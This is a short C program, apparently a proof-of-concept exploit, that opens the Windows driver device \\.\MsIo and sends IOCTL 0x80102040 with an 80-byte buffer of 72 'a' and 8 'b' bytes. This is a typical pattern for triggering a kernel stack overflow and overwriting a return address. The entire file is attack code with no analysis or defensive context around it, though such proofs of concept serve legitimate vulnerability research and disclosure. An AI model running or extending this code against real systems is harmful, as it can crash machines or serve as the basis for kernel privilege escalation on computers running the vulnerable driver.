#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define DEVICE_NAME "\\\\.\\MsIo"
#define IOCTL_CODE 0x80102040

int main() {
	HANDLE hDevice;
	char payload[80] = { '\0' };

	/* grab a file handle to the device driver */
	hDevice = CreateFileA(
	DEVICE_NAME,
	FILE_READ_ACCESS | FILE_WRITE_ACCESS,
	FILE_SHARE_READ | FILE_SHARE_WRITE,
	NULL,
	OPEN_EXISTING,
	FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
	NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}

	/* setup proof-of-concept payload */
	memset(payload, 'a', 72);
	memset(payload + 72, 'b', 8);

	/* send payload to device driver */
	if (!DeviceIoControl(
		hDevice,
		IOCTL_CODE,
		payload,
		sizeof(payload),
		NULL,
		0,
		NULL,
		NULL
		)) {
			printf("[!] DeviceIoControl failed with error %lu.\n", GetLastError());
			ExitProcess(0);
		}
	return 0;
}